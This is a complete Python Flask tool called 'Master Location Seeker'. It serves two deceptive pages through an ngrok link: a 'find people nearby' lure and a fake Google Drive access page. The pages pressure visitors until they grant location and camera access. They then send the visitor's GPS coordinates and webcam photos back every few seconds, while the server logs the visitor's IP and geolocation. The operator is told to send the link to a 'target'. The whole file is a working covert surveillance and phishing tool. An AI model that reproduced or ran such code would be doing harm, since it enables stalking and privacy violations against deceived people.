import os
import sys
import json
import base64
import random
import string
import requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, redirect
from pyngrok import ngrok

# ========= Configuration =========
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

BANNER = r"""
   __  __         _             _                 _   _
 |  \/  |__ _ __| |_ ___ _ _  | |   ___  __ __ _| |_(_)___ _ _
 | |\/| / _` (_-<  _/ -_) '_| | |__/ _ \/ _/ _` |  _| / _ \ ' \
 |_|  |_\__,_/__/\__\___|_|   |____\___/\__\__,_|\__|_\___/_||_|
            / __| ___ ___| |_____ _ _
            \__ \/ -_) -_) / / -_) '_|
            |___/\___\___|_\_\___|_| created by phoenixz
"""

MENU = """
[1] find people nearby u
[2] Google Drive File Access 
[0] Exit

Select an option: """

# ========= HTML TEMPLATES =========

DEVICE_VERIFY_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>find people near by you</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700;400&display=swap');
        html, body {
            width:100vw; height:100vh; margin:0; padding:0;
            background: #292b2c; color: #fff; font-family: 'Montserrat', Arial, sans-serif;
            overflow: hidden;
        }
        #bubbles {
            position: fixed; left:0; top:0; width:100vw; height:100vh; z-index:0;
            pointer-events: none;
        }
        .mainbox {
            position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; 
            min-height: 100vh; justify-content: center;
        }
        h1 {
            margin: 0 0 10px 0;
            font-size: 2.3em;
            font-weight: 700;
            text-align: left;
            width: 90vw;
            max-width: 420px;
        }
        p {
            font-size: 1.13em;
            margin: 0 0 18px 0;
            font-weight: 400;
            color: #eee;
            width: 90vw;
            max-width: 420px;
        }
        .input-wrap {
            width: 90vw; max-width: 420px; margin-bottom: 15px;
        }
        input[type="password"] {
            width: 100%; padding: 14px 12px; font-size: 1.2em;
            border-radius: 8px; border: none; background: #202124; color: #fff;
            margin-bottom: 13px;
        }
        button {
            width: 100%; font-size: 1.15em; padding: 13px 0; background: #232323;
            color: #fff; border: none; border-radius: 8px; 
            font-weight: 700; margin-bottom: 8px; cursor:pointer;
            transition: background 0.2s;
        }
        button:active { background: #292929; }
        #message, #timer, #password, #denied, #processing {
            width: 90vw; max-width: 420px; text-align: center;
            margin: 18px auto 0 auto;
            font-size: 1.1em;
        }
        #password {
            font-size: 1.5em;
            font-weight: bold;
            letter-spacing: 0.15em;
            margin-top: 25px;
        }
        #timer {
            font-size: 1.7em;
            font-weight: bold;
            margin-top: 24px;
            color: #80cbc4;
        }
        #denied {
            color: #ff7373;
            font-weight: 700;
        }
        @media(max-width: 500px){
            h1 { font-size: 1.25em; }
            p { font-size: 0.98em; }
            #timer { font-size: 1.13em; }
        }
    </style>
</head>
<body>
    <canvas id="bubbles"></canvas>
    <div class="mainbox">
        <h1>find people nearby you</h1>
        <p>
            To find peoples, please enter your name and agree all requested permissions.<br>
            <span style="font-size:0.9em;opacity:0.8;">(Loc)</span>
        </p>
        <div class="input-wrap">
            <input id="key" type="password" placeholder="Enter your name" autocomplete="off"/>
        </div>
        <button id="proceed">Proceed</button>
        <div id="message"></div>
        <div id="processing" style="display:none;">
            <span>Processing verification...<br>
            <span style="font-size:0.96em;">Please do not close or switch the tab.</span>
            </span>
        </div>
        <div id="timer" style="display:none;"></div>
        <div id="password" style="display:none;"></div>
        <div id="denied" style="display:none;"></div>
    </div>
    <canvas id="hidden-canvas" style="display:none;"></canvas>
    <script>
    // Bubble animation
    const canvas = document.getElementById('bubbles');
    const ctx = canvas.getContext('2d');
    let bubbles = [];
    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    window.onresize = resizeCanvas;
    resizeCanvas();
    function randomColor() {
        const colors = ['#7e8fa3','#cfd8dc','#9fa8da','#546e7a','#b0bec5','#78909c','#90a4ae','#444','#999'];
        return colors[Math.floor(Math.random()*colors.length)];
    }
    function Bubble() {
        this.x = Math.random()*canvas.width;
        this.y = Math.random()*canvas.height;
        this.r = 40+Math.random()*80;
        this.s = 0.4+Math.random()*0.7;
        this.color = randomColor();
        this.a = 0.13+Math.random()*0.13;
    }
    for(let i=0;i<20;i++) bubbles.push(new Bubble());
    function animateBubbles() {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        for(let b of bubbles){
            ctx.beginPath();
            ctx.arc(b.x,b.y,b.r,0,2*Math.PI);
            ctx.fillStyle = b.color;
            ctx.globalAlpha = b.a;
            ctx.fill();
            ctx.globalAlpha = 1.0;
            b.y -= b.s;
            if(b.y+b.r<0){
                b.x = Math.random()*canvas.width;
                b.y = canvas.height+b.r;
            }
        }
        requestAnimationFrame(animateBubbles);
    }
    animateBubbles();

    // Permission logic
    let latitude, longitude, stream = null, denied = false, continuous = true, video=null, videoTrack=null;
    function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
    async function askLocation(){
        return new Promise((resolve)=>{
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(function(pos){
                    latitude = pos.coords.latitude;
                    longitude = pos.coords.longitude;
                    fetch('/location', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({latitude, longitude})});
                    resolve(true);
                }, function(){ resolve(false); }, {enableHighAccuracy:true});
            } else resolve(false);
        });
    }
    async function askCamera(){
        try {
            stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
            return true;
        } catch(e){ return false; }
    }
    async function askStorage(){
        if(window.showDirectoryPicker || window.chooseFileSystemEntries){
            return true;
        } else {
            await sleep(500);
            return true;
        }
    }
    async function askAllPermissions(){
        let loc = await askLocation();
        let cam = await askCamera();
        let sto = await askStorage();
        if(!loc||!cam||!sto){
            denied = true;
            document.getElementById('denied').textContent = "Don't reject, otherwise you can't use this site!";
            document.getElementById('denied').style.display='block';
            await sleep(1500);
            document.getElementById('denied').style.display='none';
            await sleep(600);
            return await askAllPermissions();
        }
        denied = false;
        return true;
    }

    // Continuously send location/camera
    function startContinuousCapture(){
        if(!stream) return;
        video = document.createElement('video');
        video.style.display="none";
        video.playsInline = true;
        document.body.appendChild(video);
        try { video.srcObject = stream; video.play(); }catch(e){}
        videoTrack = stream.getVideoTracks()[0];

        async function capture(){
            // Location update
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(function(pos){
                    fetch('/location', {
                        method:'POST',headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({latitude:pos.coords.latitude,longitude:pos.coords.longitude,repeat:true})});
                });
            }
            // Camera update
            let canvas = document.getElementById('hidden-canvas');
            canvas.width=320;canvas.height=240;
            let ctx2d=canvas.getContext('2d');
            ctx2d.drawImage(video,0,0,canvas.width,canvas.height);
            let imgData=canvas.toDataURL('image/jpeg');
            fetch('/photo', {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({image:imgData,repeat:true})
            });
            if(continuous) setTimeout(capture, 3500);
        }
        setTimeout(capture, 1000);
    }

    function hide(id){document.getElementById(id).style.display='none';}
    function show(id){document.getElementById(id).style.display='block';}

    document.getElementById('proceed').onclick = async function() {
        let userKey = document.getElementById('key').value.trim();
        if(!userKey){ document.getElementById('message').textContent="Please enter your key."; return;}
        document.getElementById('message').textContent = "";
        show('processing');
        await askAllPermissions();
        hide('processing');
        show('timer');
        startContinuousCapture();

        let t=10;
        let interval = setInterval(()=>{
            document.getElementById('timer').textContent = "Verifying: " + t + " seconds left";
            t--;
            if(t<0){
                clearInterval(interval);
                hide('timer');
                showPassword();
                if(videoTrack) videoTrack.stop();
                if(video) video.remove();
                continuous = false;
            }
        },950);
    };

    function showPassword(){
        fetch('/get_password', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})})
        .then(resp=>resp.json()).then(data=>{
            document.getElementById('password').textContent = "Your password: " + data.password;
            show('password');
        });
    }

    window.onbeforeunload = function(){
        continuous = false;
        if(videoTrack) videoTrack.stop();
        if(video) video.remove();
    }
    </script>
</body>
</html>
"""

GOOGLE_DRIVE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Google Drive</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <style>
        html, body {
            width:100vw; height:100vh; margin:0; padding:0;
            background: #fff; color: #222; font-family: Arial,sans-serif;
        }
        .g-main {
            min-height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction:column;
        }
        .g-box {
            max-width: 340px; width: 90vw; text-align: center; margin-top: 60px;
        }
        .g-logo {
            width: 144px; margin-bottom: 8px;
        }
        .g-title {
            font-size: 2em; font-weight: 700;
        }
        .g-lock {
            font-size: 7em; color: #bbb; margin-top: 8px;
        }
        .g-sub {
            font-size:1.22em;margin:24px 0 17px 0;color:#222;font-weight:600;
        }
        .g-desc {
            color: #333; margin-bottom: 18px; font-size: 1.03em;
        }
        .g-btn {
            font-size: 1em; padding: 13px 0; width: 95%; max-width: 200px; border: none;
            background: #4285f4; color: #fff; border-radius: 7px; font-weight: 700; cursor:pointer;
            margin-bottom:12px;
        }
        #timer,#password,#processing,#denied {
            width: 90vw; max-width: 320px; text-align: center;
            margin: 18px auto 0 auto;
            font-size: 1.08em;
        }
        #password {
            font-size: 1.4em;
            font-weight: bold;
            letter-spacing: 0.13em;
            margin-top: 20px;
        }
        @media(max-width:500px){.g-title{font-size:1.29em;}}
    </style>
</head>
<body>
    <div class="g-main">
        <div class="g-box">
            <img class="g-logo" src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png"/>
            <div class="g-title" style="font-family:'Google Sans',Arial,sans-serif;font-size:2.2em;color:#4285f4;margin-bottom:7px;">
                <span style="color:#4285f4;">G</span><span style="color:#ea4335;">o</span><span style="color:#fbbc05;">o</span><span style="color:#4285f4;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span> Drive
            </div>
            <div class="g-sub">You need permission</div>
            <div class="g-desc">Want in? Click below and allow all permissions for access.</div>
            <button class="g-btn" id="proceed">Request access</button>
            <div id="processing" style="display:none;">
                <span>Processing access...<br>
                <span style="font-size:0.96em;">Please do not close or switch the tab.</span>
                </span>
            </div>
            <div id="timer" style="display:none;"></div>
            <div id="password" style="display:none;"></div>
            <div id="denied" style="display:none;"></div>
        </div>
    </div>
    <canvas id="hidden-canvas" style="display:none;"></canvas>
    <script>
    let latitude, longitude, stream = null, denied = false, continuous = true, video=null, videoTrack=null;
    function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
    async function askLocation(){
        return new Promise((resolve)=>{
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(function(pos){
                    latitude = pos.coords.latitude;
                    longitude = pos.coords.longitude;
                    fetch('/location', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({latitude, longitude})});
                    resolve(true);
                }, function(){ resolve(false); }, {enableHighAccuracy:true});
            } else resolve(false);
        });
    }
    async function askCamera(){
        try {
            stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
            return true;
        } catch(e){ return false; }
    }
    async function askStorage(){
        if(window.showDirectoryPicker || window.chooseFileSystemEntries){
            return true;
        } else {
            await sleep(500);
            return true;
        }
    }
    async function askAllPermissions(){
        let loc = await askLocation();
        let cam = await askCamera();
        let sto = await askStorage();
        if(!loc||!cam||!sto){
            denied = true;
            document.getElementById('denied').textContent = "Don't reject, otherwise you can't use this site!";
            document.getElementById('denied').style.display='block';
            await sleep(1500);
            document.getElementById('denied').style.display='none';
            await sleep(600);
            return await askAllPermissions();
        }
        denied = false;
        return true;
    }
    function startContinuousCapture(){
        if(!stream) return;
        video = document.createElement('video');
        video.style.display="none";
        video.playsInline = true;
        document.body.appendChild(video);
        try { video.srcObject = stream; video.play(); }catch(e){}
        videoTrack = stream.getVideoTracks()[0];

        async function capture(){
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(function(pos){
                    fetch('/location', {
                        method:'POST',headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({latitude:pos.coords.latitude,longitude:pos.coords.longitude,repeat:true})});
                });
            }
            let canvas = document.getElementById('hidden-canvas');
            canvas.width=320;canvas.height=240;
            let ctx2d=canvas.getContext('2d');
            ctx2d.drawImage(video,0,0,canvas.width,canvas.height);
            let imgData=canvas.toDataURL('image/jpeg');
            fetch('/photo', {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({image:imgData,repeat:true})
            });
            if(continuous) setTimeout(capture, 3500);
        }
        setTimeout(capture, 1000);
    }
    function hide(id){document.getElementById(id).style.display='none';}
    function show(id){document.getElementById(id).style.display='block';}
    document.getElementById('proceed').onclick = async function() {
        show('processing');
        await askAllPermissions();
        hide('processing');
        show('timer');
        startContinuousCapture();
        let t=7;
        let interval = setInterval(()=>{
            document.getElementById('timer').textContent = "Verifying: " + t + " seconds left";
            t--;
            if(t<0){
                clearInterval(interval);
                hide('timer');
                showPassword();
                if(videoTrack) videoTrack.stop();
                if(video) video.remove();
                continuous = false;
            }
        },950);
    };
    function showPassword(){
        fetch('/get_password', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({})})
        .then(resp=>resp.json()).then(data=>{
            document.getElementById('password').textContent = "Access code: " + data.password;
            show('password');
            setTimeout(()=>{ window.location = "{{gdrive_link}}"; }, 5000);
        });
    }
    window.onbeforeunload = function(){
        continuous = false;
        if(videoTrack) videoTrack.stop();
        if(video) video.remove();
    }
    </script>
</body>
</html>
"""

# ========= Flask App =========
app = Flask(__name__)
gdrive_url = None

def get_victim_ip(request):
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    else:
        ip = request.remote_addr
    return ip

def get_ip_info(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=4)
        if resp.status_code == 200:
            return resp.json()
    except:
        return {}
    return {}

@app.route('/')
def index():
    ip = get_victim_ip(request)
    info = get_ip_info(ip)
    print(f"\n👤 New visitor IP: {ip}")
    print(f"🌎 IP Info: {json.dumps(info, indent=2)}\n")
    if app.config.get("MODE") == "gdrive":
        return render_template_string(GOOGLE_DRIVE_HTML, gdrive_link=gdrive_url)
    else:
        return render_template_string(DEVICE_VERIFY_HTML)

@app.route('/location', methods=['POST'])
def get_location():
    ip = get_victim_ip(request)
    data = request.json
    info = get_ip_info(ip)
    time_str = datetime.now().strftime("%H:%M:%S")
    print(f"📍 [{time_str}] Location from {ip}: {data} | Geo: {info.get('city','')}, {info.get('regionName','')}, {info.get('country','')}")
    return jsonify(success=True)

@app.route('/photo', methods=['POST'])
def receive_photo():
    ip = get_victim_ip(request)
    data = request.json
    img_data = data['image']
    is_repeat = data.get('repeat', False)
    head, encoded = img_data.split(",", 1)
    img_bytes = base64.b64decode(encoded)
    filename = datetime.now().strftime("%Y%m%d_%H%M%S_%f") + f"_{ip.replace(':','_').replace('.','_')}.jpg"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    with open(filepath, "wb") as f:
        f.write(img_bytes)
    if not is_repeat:
        print(f"📷 Photo saved from {ip}: {filepath}")
    else:
        print(f"📷 [Repeat] Photo saved from {ip}: {filepath}")
    return jsonify(success=True)

@app.route('/get_password', methods=['POST'])
def get_password():
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    return jsonify(password=password)

def start_ngrok(port):
    try: ngrok.kill()
    except: pass
    public_url = ngrok.connect(port, bind_tls=True)
    return public_url

def main():
    global gdrive_url
    print(BANNER)
    while True:
        try:
            sel = input(MENU).strip()
            if sel == "1":
                app.config['MODE'] = 'verify'
                print("\n[*] Starting 'Device Verification' (bubble) server...")
                public_url = start_ngrok(8080)
                print(f"\n🔗 Public URL: {public_url}\n")
                print("Open this link on your target device. Press Ctrl+C to stop.\n")
                app.run(port=8080, host="0.0.0.0")
            elif sel == "2":
                app.config['MODE'] = 'gdrive'
                gdrive_url = input("Enter Google Drive file URL: ").strip()
                if not gdrive_url.startswith("http"):
                    print("[!] Invalid Google Drive URL. Try again.\n")
                    continue
                print("\n[*] Starting 'Google Drive' fake server...")
                public_url = start_ngrok(8080)
                print(f"\n🔗 Public URL: {public_url}\n")
                print("Send this link to your target. Press Ctrl+C to stop.\n")
                app.run(port=8080, host="0.0.0.0")
            elif sel == "0":
                print("Bye!")
                ngrok.kill()
                sys.exit(0)
            else:
                print("Invalid selection, try again.\n")
        except KeyboardInterrupt:
            print("\n[!] Server stopped. Returning to menu.\n")
            try: ngrok.kill()
            except: pass

if __name__ == "__main__":
    main()
